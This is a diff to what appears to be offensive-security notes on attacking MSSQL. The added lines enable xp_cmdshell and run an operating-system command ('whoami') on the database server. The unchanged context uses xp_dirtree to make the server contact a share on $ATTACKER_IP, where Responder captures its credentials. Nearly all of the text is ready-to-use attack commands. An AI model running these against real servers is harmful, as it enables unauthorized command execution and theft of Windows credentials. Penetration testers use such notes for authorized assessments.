@@ -49,6 +49,15 @@ Try:
 enable_xp_cmdshell
 ```
 
+or:
+```mssql
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+```
+
 in MSSQL server try, start responder on attacker box:
 ```sql
 xp_dirtree "\\$ATTACKER_IP\fake\share";
